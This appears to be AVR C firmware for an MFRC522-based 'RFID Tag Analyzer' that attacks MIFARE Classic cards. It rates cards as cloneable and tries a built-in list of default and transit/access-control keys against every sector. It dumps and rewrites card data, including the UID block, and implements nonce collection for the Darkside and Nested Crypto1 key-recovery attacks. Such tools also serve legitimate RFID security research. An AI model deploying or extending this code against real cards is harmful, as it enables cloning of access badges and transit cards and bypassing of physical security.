#include <avr/io.h>
#include <avr/pgmspace.h>
#include <util/delay.h>
#include <string.h>
#include "uart.h"
#include "spi.h"
#include "mfrc522.h"
#include "crypto1.h"

#define MODE_IDLE       0
#define MODE_CONTINUOUS 1
#define MODE_ONESHOT    2
#define MODE_WRITE      3
#define MODE_WRITE_BLK0 4
#define MODE_DARKSIDE   5
#define MODE_NESTED     6

// Print chip type and cloneability based on SAK byte (human-readable)
static void print_chip_info(uint8_t sak) {
    uart_puts("Chip Type: ");

    if (sak & 0x04) {
        uart_puts("(incomplete UID, cascade error)\r\n");
        return;
    }

    switch (sak) {
    case 0x08:
        uart_puts("MIFARE Classic 1K\r\n");
        uart_puts("Cloneable with RC522: YES\r\n");
        break;
    case 0x18:
        uart_puts("MIFARE Classic 4K\r\n");
        uart_puts("Cloneable with RC522: YES\r\n");
        break;
    case 0x09:
        uart_puts("MIFARE Mini\r\n");
        uart_puts("Cloneable with RC522: YES\r\n");
        break;
    case 0x20:
        uart_puts("MIFARE DESFire or MIFARE Plus\r\n");
        uart_puts("ISO 14443-4: YES\r\n");
        uart_puts("Cloneable with RC522: NO\r\n");
        uart_puts("Note: AES-128 encryption. Need PN532 or Proxmark3.\r\n");
        break;
    case 0x00:
        uart_puts("MIFARE Ultralight or NTAG\r\n");
        uart_puts("Cloneable with RC522: PARTIAL (no crypto)\r\n");
        break;
    case 0x01:
        uart_puts("TNP3xxx (NFC Forum Type 2)\r\n");
        uart_puts("Cloneable with RC522: NO\r\n");
        break;
    case 0x10:
        uart_puts("MIFARE Plus (SL2)\r\n");
        uart_puts("Cloneable with RC522: NO\r\n");
        break;
    case 0x11:
        uart_puts("MIFARE Plus (SL3)\r\n");
        uart_puts("Cloneable with RC522: NO\r\n");
        break;
    default:
        uart_puts("Unknown (SAK=0x");
        uart_put_hex(sak);
        uart_puts(")\r\n");
        uart_puts("Cloneable with RC522: UNKNOWN\r\n");
        break;
    }
}

// Send tag data in protocol format: TAG:<atqa>:<uid>:<sak>:<uid_len>
static void send_tag_protocol(uint8_t *atqa, uint8_t *uid, uint8_t uid_len, uint8_t sak) {
    uart_puts("TAG:");
    uart_put_hex(atqa[0]);
    uart_put_hex(atqa[1]);
    uart_putc(':');
    for (uint8_t i = 0; i < uid_len; i++) {
        uart_put_hex(uid[i]);
    }
    uart_putc(':');
    uart_put_hex(sak);
    uart_putc(':');
    uart_putc('0' + uid_len);
    uart_puts("\r\n");
}

#define NUM_KEYS 24

static const uint8_t PROGMEM known_keys[NUM_KEYS][6] = {
    // Factory defaults
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},  // Most common default
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00},  // Zeros
    // NXP application keys
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5},  // MAD key A
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5},  // MAD key B / transport
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7},  // NDEF key
    // Common vendor/system keys
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD},
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A},
    {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97},
    {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F},
    {0xA0, 0x47, 0x8C, 0xC3, 0x90, 0x91},
    {0x53, 0x3C, 0xB6, 0xC7, 0x23, 0xF6},
    {0x8F, 0xD0, 0xA4, 0xF2, 0x56, 0xE9},
    // Access control / transit keys
    {0xA6, 0xB0, 0xC7, 0x2A, 0x0C, 0x13},
    {0xFC, 0x00, 0x01, 0x87, 0x78, 0xF7},
    {0xB5, 0xFF, 0x67, 0xCB, 0xA9, 0x51},
    {0x4B, 0x79, 0x1B, 0xEA, 0x7B, 0xCC},
    {0xB1, 0x27, 0xC6, 0xF4, 0x14, 0x36},
    {0x48, 0x45, 0x58, 0x45, 0x4C, 0x50},  // "HEXELP"
    // Sequential / pattern keys
    {0x01, 0x02, 0x03, 0x04, 0x05, 0x06},
    {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56},
    {0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0},
    {0xA1, 0xB1, 0xC1, 0xD1, 0xE1, 0xF1},
    // Test / debug keys
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF},
    {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC},
};

// Re-select the card after a failed auth (card requires full re-activation).
// Returns MI_OK if card re-selected, MI_ERR otherwise.
static uint8_t reselect_card(uint8_t *uid) {
    uint8_t atqa[2];
    uint8_t sak;

    if (mfrc522_request(PICC_REQALL, atqa) != MI_OK)
        return MI_ERR;
    if (mfrc522_anticoll(PICC_ANTICOLL1, uid) != MI_OK)
        return MI_ERR;
    if (mfrc522_select(PICC_ANTICOLL1, uid, &sak) != MI_OK)
        return MI_ERR;
    return MI_OK;
}

// Perform manual authentication capturing the plaintext nonce.
// Uses PCD_Transceive (not PCD_MFAuthent) so we get the raw nonce.
// Retries up to max_retries times to find a nonce where auto-parity works.
// On success: nt_out contains the 4-byte plaintext nonce, crypto state is active.
// Returns MI_OK on success, MI_ERR on failure.
static uint8_t manual_auth(uint8_t block, uint8_t *key, uint8_t *uid,
                           uint8_t *nt_out, crypto1_state *cs_out,
                           uint16_t max_retries) {
    uint8_t cmd[2];
    uint8_t nt[4];
    uint8_t response[8];
    uint8_t at_buf[4];
    uint8_t back_len;
    uint8_t status;
    uint8_t atqa[2];
    uint8_t sak;

    for (uint16_t retry = 0; retry < max_retries; retry++) {
        // Ensure CRC is in default state (off) for card selection
        // mfrc522_request/anticoll/select use manual CRC
        mfrc522_clear_bit(TxModeReg, 0x80);
        mfrc522_clear_bit(RxModeReg, 0x80);

        // Re-select card each attempt
        if (mfrc522_request(PICC_REQALL, atqa) != MI_OK) continue;
        if (mfrc522_anticoll(PICC_ANTICOLL1, uid) != MI_OK) continue;
        if (mfrc522_select(PICC_ANTICOLL1, uid, &sak) != MI_OK) continue;

        // Step 1: Send AUTH command, receive plaintext nonce
        // Use hardware CRC: send 2 bytes, MFRC522 appends CRC
        cmd[0] = PICC_AUTHKA;
        cmd[1] = block;

        // Need CRC on TX, no CRC on RX for this step
        mfrc522_set_bit(TxModeReg, 0x80);    // TxCRCEn = 1
        mfrc522_clear_bit(RxModeReg, 0x80);  // RxCRCEn = 0
        mfrc522_write_reg(BitFramingReg, 0x00);

        status = mfrc522_to_card(PCD_Transceive, cmd, 2, nt, &back_len);
        if (status != MI_OK || back_len != 32) {
            mfrc522_halt();
            continue;
        }

        // Step 2: Initialize crypto1
        crypto1_state cs;
        crypto1_init(&cs, key);

        // Feed uid ^ nt into LFSR
        uint32_t uid32 = ((uint32_t)uid[0]) | ((uint32_t)uid[1] << 8) |
                         ((uint32_t)uid[2] << 16) | ((uint32_t)uid[3] << 24);
        uint32_t nt32 = ((uint32_t)nt[0]) | ((uint32_t)nt[1] << 8) |
                        ((uint32_t)nt[2] << 16) | ((uint32_t)nt[3] << 24);
        crypto1_word(&cs, uid32 ^ nt32, 0);

        // Step 3: Check if parity will work for 8-byte response
        crypto1_state cs_check = cs;  // copy state
        if (!parity_check_ok(&cs_check, 8)) {
            mfrc522_halt();
            continue;  // Parity won't match, try new nonce
        }

        // Step 4: Compute encrypted response
        // nr = reader nonce (use retry counter as simple source)
        uint32_t nr = retry | ((uint32_t)retry << 16);
        uint32_t ar = prng_successor(nt32, 64);

        // Encrypt nr
        uint32_t ks_nr = crypto1_word(&cs, nr, 1);
        uint32_t nr_enc = nr ^ ks_nr;

        // Encrypt ar
        uint32_t ks_ar = crypto1_word(&cs, ar, 1);
        uint32_t ar_enc = ar ^ ks_ar;

        // Pack into response buffer (LSB first byte order)
        response[0] = nr_enc & 0xFF;
        response[1] = (nr_enc >> 8) & 0xFF;
        response[2] = (nr_enc >> 16) & 0xFF;
        response[3] = (nr_enc >> 24) & 0xFF;
        response[4] = ar_enc & 0xFF;
        response[5] = (ar_enc >> 8) & 0xFF;
        response[6] = (ar_enc >> 16) & 0xFF;
        response[7] = (ar_enc >> 24) & 0xFF;

        // Step 5: Send encrypted response, expect 4-byte at
        // No CRC on TX or RX for this step
        mfrc522_clear_bit(TxModeReg, 0x80);  // TxCRCEn = 0
        mfrc522_clear_bit(RxModeReg, 0x80);  // RxCRCEn = 0

        status = mfrc522_to_card(PCD_Transceive, response, 8, at_buf, &back_len);
        if (status != MI_OK || back_len != 32) {
            mfrc522_halt();
            continue;
        }

        // Step 6: Verify at
        uint32_t at_enc32 = ((uint32_t)at_buf[0]) | ((uint32_t)at_buf[1] << 8) |
                            ((uint32_t)at_buf[2] << 16) | ((uint32_t)at_buf[3] << 24);
        uint32_t ks_at = crypto1_word(&cs, 0, 0);
        uint32_t at = at_enc32 ^ ks_at;
        uint32_t expected_at = prng_successor(nt32, 96);

        if (at != expected_at) {
            mfrc522_halt();
            continue;
        }

        // Auth successful!
        memcpy(nt_out, nt, 4);
        *cs_out = cs;

        // Restore CRC to default (off) for normal operation
        mfrc522_clear_bit(TxModeReg, 0x80);
        mfrc522_clear_bit(RxModeReg, 0x80);

        return MI_OK;
    }

    // Restore CRC to default (off)
    mfrc522_clear_bit(TxModeReg, 0x80);
    mfrc522_clear_bit(RxModeReg, 0x80);

    return MI_ERR;
}

// Try authenticating a block with all known keys (Key A and Key B).
// Re-selects card between failed attempts (MIFARE Classic requirement).
// Returns MI_OK on first success, MI_ERR if all attempts fail.
static uint8_t try_auth(uint8_t block, uint8_t *uid) {
    uint8_t key_buf[6];
    uint8_t first_attempt = 1;

    for (uint8_t k = 0; k < NUM_KEYS; k++) {
        for (uint8_t i = 0; i < 6; i++) {
            key_buf[i] = pgm_read_byte(&known_keys[k][i]);
        }

        // Key A
        if (!first_attempt) {
            mfrc522_stop_crypto();
            if (reselect_card(uid) != MI_OK)
                return MI_ERR;
        }
        first_attempt = 0;

        if (mfrc522_auth(PICC_AUTHKA, block, key_buf, uid) == MI_OK)
            return MI_OK;

        // Key B
        mfrc522_stop_crypto();
        if (reselect_card(uid) != MI_OK)
            return MI_ERR;

        if (mfrc522_auth(PICC_AUTHKB, block, key_buf, uid) == MI_OK)
            return MI_OK;
    }

    mfrc522_stop_crypto();
    return MI_ERR;
}

static void send_block_data(uint8_t block, uint8_t *data) {
    uart_puts("DATA:");
    uart_put_hex(block);
    uart_putc(':');
    for (uint8_t i = 0; i < 16; i++) {
        uart_put_hex(data[i]);
    }
    uart_puts("\r\n");
}

static void do_dump(void) {
    uint8_t status;
    uint8_t atqa[2];
    uint8_t uid[5];
    uint8_t sak;
    uint8_t block_data[18]; // 16 data + 2 CRC from read

    // Detect card (REQALL wakes halted cards too)
    status = mfrc522_request(PICC_REQALL, atqa);
    if (status != MI_OK) {
        uart_puts("ERR:NO_TAG\r\n");
        return;
    }

    status = mfrc522_anticoll(PICC_ANTICOLL1, uid);
    if (status != MI_OK) {
        uart_puts("ERR:ANTICOLL\r\n");
        return;
    }

    status = mfrc522_select(PICC_ANTICOLL1, uid, &sak);
    if (status != MI_OK) {
        uart_puts("ERR:SELECT\r\n");
        return;
    }

    // Read all 16 sectors
    for (uint8_t sector = 0; sector < 16; sector++) {
        uint8_t first_block = sector * 4;

        // Authenticate sector with common keys
        status = try_auth(first_block, uid);
        if (status != MI_OK) {
            uart_puts("ERR:AUTH_FAIL:");
            uart_put_hex(sector);
            uart_puts("\r\n");
            continue;
        }

        // Read all 4 blocks in sector
        for (uint8_t b = 0; b < 4; b++) {
            uint8_t block = first_block + b;
            status = mfrc522_read_block(block, block_data);
            if (status == MI_OK) {
                send_block_data(block, block_data);
            } else {
                uart_puts("ERR:READ_FAIL:");
                uart_put_hex(block);
                uart_puts("\r\n");
            }
        }
    }

    mfrc522_stop_crypto();
    mfrc522_halt();
    uart_puts("OK:DUMP_COMPLETE\r\n");
}

static uint8_t hex_char_to_val(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return 0xFF;
}

// Perform one scan cycle. Returns 1 if tag found, 0 otherwise.
static uint8_t do_scan(void) {
    uint8_t status;
    uint8_t atqa[2];
    uint8_t uid_cl1[5];
    uint8_t uid_cl2[5];
    uint8_t full_uid[10];
    uint8_t uid_len;
    uint8_t sak;

    status = mfrc522_request(PICC_REQIDL, atqa);
    if (status != MI_OK) return 0;

    status = mfrc522_anticoll(PICC_ANTICOLL1, uid_cl1);
    if (status != MI_OK) return 0;

    status = mfrc522_select(PICC_ANTICOLL1, uid_cl1, &sak);
    if (status != MI_OK) {
        uart_puts("ERR:SELECT CL1 failed\r\n");
        return 0;
    }

    uid_len = 4;
    if (sak & 0x04) {
        full_uid[0] = uid_cl1[1];
        full_uid[1] = uid_cl1[2];
        full_uid[2] = uid_cl1[3];

        status = mfrc522_anticoll(PICC_ANTICOLL2, uid_cl2);
        if (status != MI_OK) {
            uart_puts("ERR:ANTICOLL CL2 failed\r\n");
            return 0;
        }

        status = mfrc522_select(PICC_ANTICOLL2, uid_cl2, &sak);
        if (status != MI_OK) {
            uart_puts("ERR:SELECT CL2 failed\r\n");
            return 0;
        }

        full_uid[3] = uid_cl2[0];
        full_uid[4] = uid_cl2[1];
        full_uid[5] = uid_cl2[2];
        full_uid[6] = uid_cl2[3];
        uid_len = 7;

        if (sak & 0x04) {
            uart_puts("ERR:Triple-size UID not supported\r\n");
            mfrc522_halt();
            return 0;
        }
    } else {
        for (uint8_t i = 0; i < 4; i++) {
            full_uid[i] = uid_cl1[i];
        }
    }

    // LED on
    PORTC |= (1 << PC0);

    // Protocol line (for GUI)
    send_tag_protocol(atqa, full_uid, uid_len, sak);

    // Human-readable output (for terminal, ignored by GUI)
    uart_puts("ATQA: ");
    uart_put_hex(atqa[0]);
    uart_putc(' ');
    uart_put_hex(atqa[1]);
    uart_puts("  UID: ");
    for (uint8_t i = 0; i < uid_len; i++) {
        uart_put_hex(full_uid[i]);
        if (i < uid_len - 1) uart_putc(':');
    }
    uart_puts("  SAK: 0x");
    uart_put_hex(sak);
    uart_puts("\r\n");
    print_chip_info(sak);

    PORTC &= ~(1 << PC0);

    mfrc522_halt();
    return 1;
}

static uint8_t write_uid[5];
static uint8_t write_authenticated_sector;
static uint8_t dark_sector;
static uint8_t nested_known_block;
static uint8_t nested_target_block;
static uint8_t nested_key[6];

static uint8_t parse_hex_byte(const char *s) {
    uint8_t hi = hex_char_to_val(s[0]);
    uint8_t lo = hex_char_to_val(s[1]);
    if (hi == 0xFF || lo == 0xFF) return 0;
    return (hi << 4) | lo;
}

static void do_write_init(void) {
    uint8_t status;
    uint8_t atqa[2];
    uint8_t sak;

    status = mfrc522_request(PICC_REQALL, atqa);
    if (status != MI_OK) {
        uart_puts("ERR:NO_TAG\r\n");
        return;
    }

    status = mfrc522_anticoll(PICC_ANTICOLL1, write_uid);
    if (status != MI_OK) {
        uart_puts("ERR:ANTICOLL\r\n");
        return;
    }

    status = mfrc522_select(PICC_ANTICOLL1, write_uid, &sak);
    if (status != MI_OK) {
        uart_puts("ERR:SELECT\r\n");
        return;
    }

    write_authenticated_sector = 0xFF;
    uart_puts("OK:WRITE_READY\r\n");
}

static void handle_load_line(char *line, uint8_t len, uint8_t allow_block0) {
    // Expect: LOAD:<2 hex chars block>:<32 hex chars data>
    // Minimum length: 5 (LOAD:) + 2 + 1 + 32 = 40
    if (len < 40) {
        uart_puts("ERR:BAD_FORMAT\r\n");
        return;
    }

    // Parse block number
    uint8_t block = parse_hex_byte(&line[5]);

    // Skip block 0 unless allowed
    if (block == 0 && !allow_block0) {
        uart_puts("OK:SKIP_BLK0\r\n");
        return;
    }

    // Parse 16 data bytes
    uint8_t data[16];
    for (uint8_t i = 0; i < 16; i++) {
        data[i] = parse_hex_byte(&line[8 + i * 2]);
    }

    // Authenticate if needed (new sector)
    uint8_t sector = block / 4;
    if (sector != write_authenticated_sector) {
        uint8_t status = try_auth(block, write_uid);
        if (status != MI_OK) {
            uart_puts("ERR:WRITE_AUTH:");
            uart_put_hex(block);
            uart_puts("\r\n");
            return;
        }
        write_authenticated_sector = sector;
    }

    // Write block
    uint8_t status = mfrc522_write_block(block, data);
    if (status == MI_OK) {
        uart_puts("OK:WROTE:");
        uart_put_hex(block);
        uart_puts("\r\n");
    } else {
        uart_puts("ERR:WRITE_FAIL:");
        uart_put_hex(block);
        uart_puts("\r\n");
    }
}

static void do_format(void) {
    uint8_t status;
    uint8_t atqa[2];
    uint8_t uid[5];
    uint8_t sak;

    status = mfrc522_request(PICC_REQALL, atqa);
    if (status != MI_OK) {
        uart_puts("ERR:NO_TAG\r\n");
        return;
    }

    status = mfrc522_anticoll(PICC_ANTICOLL1, uid);
    if (status != MI_OK) {
        uart_puts("ERR:ANTICOLL\r\n");
        return;
    }

    status = mfrc522_select(PICC_ANTICOLL1, uid, &sak);
    if (status != MI_OK) {
        uart_puts("ERR:SELECT\r\n");
        return;
    }

    // Factory default sector trailer
    uint8_t trailer[16] = {
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Key A
        0xFF, 0x07, 0x80, 0x69,               // Access bits
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF    // Key B
    };
    uint8_t zeros[16] = {0};

    for (uint8_t sector = 0; sector < 16; sector++) {
        uint8_t first_block = sector * 4;

        status = try_auth(first_block, uid);
        if (status != MI_OK) {
            uart_puts("ERR:FORMAT_AUTH:");
            uart_put_hex(sector);
            uart_puts("\r\n");
            continue;
        }

        // Write data blocks to zeros (skip block 0 - manufacturer block)
        for (uint8_t b = 0; b < 3; b++) {
            uint8_t block = first_block + b;
            if (block == 0) continue;

            status = mfrc522_write_block(block, zeros);
            if (status != MI_OK) {
                uart_puts("ERR:FORMAT_WRITE:");
                uart_put_hex(block);
                uart_puts("\r\n");
            }
        }

        // Write sector trailer with factory default keys
        status = mfrc522_write_block(first_block + 3, trailer);
        if (status != MI_OK) {
            uart_puts("ERR:FORMAT_WRITE:");
            uart_put_hex(first_block + 3);
            uart_puts("\r\n");
        }

        uart_puts("OK:FORMAT:");
        uart_put_hex(sector);
        uart_puts("\r\n");
    }

    mfrc522_stop_crypto();
    mfrc522_halt();
    uart_puts("OK:FORMAT_COMPLETE\r\n");
}

static void do_darkside_round(void) {
    uint8_t status;
    uint8_t atqa[2];
    uint8_t uid[5];
    uint8_t sak;
    uint8_t nt[4];
    uint8_t back_len;

    // Select card
    status = mfrc522_request(PICC_REQALL, atqa);
    if (status != MI_OK) {
        uart_puts("DARK:ERR:NO_TAG\r\n");
        return;
    }
    status = mfrc522_anticoll(PICC_ANTICOLL1, uid);
    if (status != MI_OK) {
        uart_puts("DARK:ERR:ANTICOLL\r\n");
        return;
    }
    status = mfrc522_select(PICC_ANTICOLL1, uid, &sak);
    if (status != MI_OK) {
        uart_puts("DARK:ERR:SELECT\r\n");
        return;
    }

    // Send AUTH command to get plaintext nonce
    // Use hardware CRC: send 2 bytes, MFRC522 appends CRC
    uint8_t cmd[2];
    cmd[0] = PICC_AUTHKA;
    cmd[1] = dark_sector * 4;  // first block of sector

    mfrc522_set_bit(TxModeReg, 0x80);    // TX CRC on (hardware appends CRC)
    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off
    mfrc522_write_reg(BitFramingReg, 0x00);

    status = mfrc522_to_card(PCD_Transceive, cmd, 2, nt, &back_len);
    if (status != MI_OK || back_len != 32) {
        uart_puts("DARK:ERR:AUTH_CMD\r\n");
        // Restore CRC to default (off) before halt — halt uses manual CRC
        mfrc522_clear_bit(TxModeReg, 0x80);
        mfrc522_clear_bit(RxModeReg, 0x80);
        mfrc522_stop_crypto();
        mfrc522_halt();
        return;
    }

    // Send nonce to PC
    uart_puts("DARK:NT:");
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt[i]);
    uart_puts("\r\n");

    // Send 8 random bytes as auth response
    // Use a simple counter-based value for reproducibility
    static uint16_t dark_counter = 0;
    uint8_t fake_response[8];
    for (uint8_t i = 0; i < 8; i++) {
        fake_response[i] = (dark_counter >> (i & 1 ? 8 : 0)) + i;
    }
    dark_counter++;

    mfrc522_clear_bit(TxModeReg, 0x80);  // TX CRC off
    mfrc522_clear_bit(RxModeReg, 0x80);  // RX CRC off

    uint8_t resp_buf[4];
    status = mfrc522_to_card(PCD_Transceive, fake_response, 8, resp_buf, &back_len);

    // Restore CRC to default (off) — halt/request/select use manual CRC
    mfrc522_clear_bit(TxModeReg, 0x80);
    mfrc522_clear_bit(RxModeReg, 0x80);

    if (status == MI_OK && back_len == 4) {
        // Got 4-bit NACK — parity matched!
        uart_puts("DARK:NACK:");
        // Send the nr,ar we used so PC can analyze
        for (uint8_t i = 0; i < 8; i++) uart_put_hex(fake_response[i]);
        uart_puts("\r\n");
    } else {
        uart_puts("DARK:TIMEOUT\r\n");
    }

    mfrc522_stop_crypto();
    mfrc522_halt();

    // Cycle RF field to force card power-on reset between rounds.
    // Some MIFARE Classic cards need a full field reset after aborted auth.
    mfrc522_clear_bit(TxControlReg, 0x03);  // antenna off
    _delay_ms(25);
    mfrc522_set_bit(TxControlReg, 0x03);    // antenna on
    _delay_ms(25);
}

static void do_nested_collect(void) {
    uint8_t uid[5];
    uint8_t nt_known[4];
    crypto1_state cs;

    // Step 1: Manual auth to known sector
    uint8_t status = manual_auth(nested_known_block, nested_key, uid,
                                 nt_known, &cs, 500);
    if (status != MI_OK) {
        uart_puts("NESTED:FAIL:AUTH\r\n");
        return;
    }

    // Step 2: Send encrypted AUTH for target sector
    // The card is in encrypted mode (our software crypto tracks state)
    // RC522 crypto is OFF, so we encrypt in software

    uint8_t auth_cmd[4];
    auth_cmd[0] = PICC_AUTHKA;
    auth_cmd[1] = nested_target_block;

    // Compute CRC on plaintext
    // Note: CRC is computed on plaintext, then encrypted with the data
    // Actually for MIFARE Classic re-auth, the CRC calculation is on the
    // plaintext command, then everything (cmd + CRC) is encrypted
    mfrc522_calculate_crc(auth_cmd, 2, &auth_cmd[2]);

    // Check parity for 4 encrypted bytes
    crypto1_state cs_par = cs;
    if (!parity_check_ok(&cs_par, 4)) {
        uart_puts("NESTED:FAIL:PARITY\r\n");
        mfrc522_halt();
        return;
    }

    // Encrypt the 4 bytes
    uint8_t enc_cmd[4];
    for (uint8_t i = 0; i < 4; i++) {
        enc_cmd[i] = auth_cmd[i] ^ crypto1_byte(&cs, auth_cmd[i], 0);
    }

    // Send encrypted auth command, expect 4-byte plaintext nonce
    // After receiving re-auth, card drops crypto and sends nt in plaintext
    mfrc522_clear_bit(TxModeReg, 0x80);  // No CRC (already in encrypted data)
    mfrc522_clear_bit(RxModeReg, 0x80);

    uint8_t nt_target[4];
    uint8_t back_len;
    status = mfrc522_to_card(PCD_Transceive, enc_cmd, 4, nt_target, &back_len);

    // Restore CRC settings
    mfrc522_set_bit(TxModeReg, 0x80);
    mfrc522_set_bit(RxModeReg, 0x80);

    if (status != MI_OK || back_len != 32) {
        uart_puts("NESTED:FAIL:TARGET\r\n");
        mfrc522_halt();
        return;
    }

    // Send nonce pair to PC
    uart_puts("NESTED:NT:");
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_known[i]);
    uart_putc(':');
    for (uint8_t i = 0; i < 4; i++) uart_put_hex(nt_target[i]);
    uart_puts("\r\n");

    mfrc522_halt();
}

int main(void) {
    uint8_t scan_mode = MODE_IDLE;
    char line_buf[48];
    uint8_t line_pos = 0;

    spi_init();
    uart_init(9600);
    mfrc522_init();

    DDRC |= (1 << PC0);

    uart_puts("INFO:RFID Tag Analyzer v2.0\r\n");

    while (1) {
        if (uart_available()) {
            char c = uart_getc();

            if (scan_mode == MODE_WRITE || scan_mode == MODE_WRITE_BLK0) {
                // In write mode: buffer lines until \r or \n
                if (c == '\r' || c == '\n') {
                    if (line_pos > 0) {
                        line_buf[line_pos] = '\0';
                        if (line_buf[0] == 'D') {
                            mfrc522_stop_crypto();
                            mfrc522_halt();
                            uart_puts("OK:WRITE_DONE\r\n");
                            scan_mode = MODE_IDLE;
                        } else if (line_pos >= 5 && line_buf[0] == 'L') {
                            handle_load_line(line_buf, line_pos,
                                scan_mode == MODE_WRITE_BLK0 ? 1 : 0);
                        } else {
                            uart_puts("ERR:BAD_CMD\r\n");
                        }
                        line_pos = 0;
                    }
                } else if (line_pos < sizeof(line_buf) - 1) {
                    line_buf[line_pos++] = c;
                }
            } else {
                // Normal command mode (single char commands)
                switch (c) {
                case 'S':
                    scan_mode = MODE_CONTINUOUS;
                    uart_puts("OK:Scanning\r\n");
                    break;
                case 'P':
                    scan_mode = MODE_IDLE;
                    uart_puts("OK:Paused\r\n");
                    break;
                case 'O':
                    scan_mode = MODE_ONESHOT;
                    uart_puts("OK:Single scan\r\n");
                    break;
                case 'V':
                    uart_puts("INFO:RFID Tag Analyzer v2.0\r\n");
                    break;
                case 'R':
                    do_dump();
                    break;
                case 'W':
                    scan_mode = MODE_WRITE;
                    do_write_init();
                    break;
                case 'B':
                    scan_mode = MODE_WRITE_BLK0;
                    do_write_init();
                    break;
                case 'F':
                    do_format();
                    break;
                case 'K':
                    // Darkside attack — wait for sector number
                    if (uart_available()) {
                        char hi = uart_getc();
                        char lo = uart_available() ? uart_getc() : '0';
                        dark_sector = (hex_char_to_val(hi) << 4) | hex_char_to_val(lo);
                    } else {
                        dark_sector = 0;
                    }
                    scan_mode = MODE_DARKSIDE;
                    uart_puts("OK:DARKSIDE_START\r\n");

                    // Send UID
                    {
                        uint8_t atqa[2], uid[5], sak;
                        if (mfrc522_request(PICC_REQALL, atqa) == MI_OK &&
                            mfrc522_anticoll(PICC_ANTICOLL1, uid) == MI_OK &&
                            mfrc522_select(PICC_ANTICOLL1, uid, &sak) == MI_OK) {
                            uart_puts("DARK:UID:");
                            for (uint8_t i = 0; i < 4; i++) uart_put_hex(uid[i]);
                            uart_puts("\r\n");
                            mfrc522_halt();
                        }
                    }
                    break;
                case 'N':
                    // Parse: N<known_blk_2hex><target_blk_2hex><key_12hex>
                    // Total: 1 + 2 + 2 + 12 = 17 chars
                    scan_mode = MODE_NESTED;
                    // Read remaining bytes (block until we have them or timeout)
                    {
                        uint8_t nbuf[16];
                        uint8_t ni = 0;
                        while (ni < 16) {
                            if (uart_available()) {
                                nbuf[ni++] = uart_getc();
                            }
                        }
                        nested_known_block = parse_hex_byte((char*)&nbuf[0]);
                        nested_target_block = parse_hex_byte((char*)&nbuf[2]);
                        for (uint8_t i = 0; i < 6; i++) {
                            nested_key[i] = parse_hex_byte((char*)&nbuf[4 + i*2]);
                        }
                    }
                    uart_puts("OK:NESTED_START\r\n");
                    break;
                }
            }
        }

        if (scan_mode == MODE_WRITE || scan_mode == MODE_WRITE_BLK0) {
            continue;  // No delay - must read UART fast to avoid RX overflow
        }

        if (scan_mode == MODE_DARKSIDE) {
            if (uart_available()) {
                char c = uart_getc();
                if (c == 'X' || c == 'P') {
                    scan_mode = MODE_IDLE;
                    uart_puts("DARK:DONE\r\n");
                    continue;
                }
            }
            do_darkside_round();
            _delay_ms(5);  // brief pause between rounds
            continue;
        }

        if (scan_mode == MODE_NESTED) {
            static uint8_t nested_rounds = 0;
            if (uart_available()) {
                char c = uart_getc();
                if (c == 'X' || c == 'P') {
                    scan_mode = MODE_IDLE;
                    nested_rounds = 0;
                    uart_puts("NESTED:DONE\r\n");
                    continue;
                }
            }
            do_nested_collect();
            nested_rounds++;
            if (nested_rounds >= 5) {
                uart_puts("NESTED:DONE\r\n");
                scan_mode = MODE_IDLE;
                nested_rounds = 0;
            }
            _delay_ms(10);
            continue;
        }

        if (scan_mode == MODE_IDLE) {
            _delay_ms(10);
            continue;
        }

        if (do_scan()) {
            if (scan_mode == MODE_ONESHOT) {
                scan_mode = MODE_IDLE;
            }
            _delay_ms(1500);
        } else {
            _delay_ms(200);
        }
    }

    return 0;
}
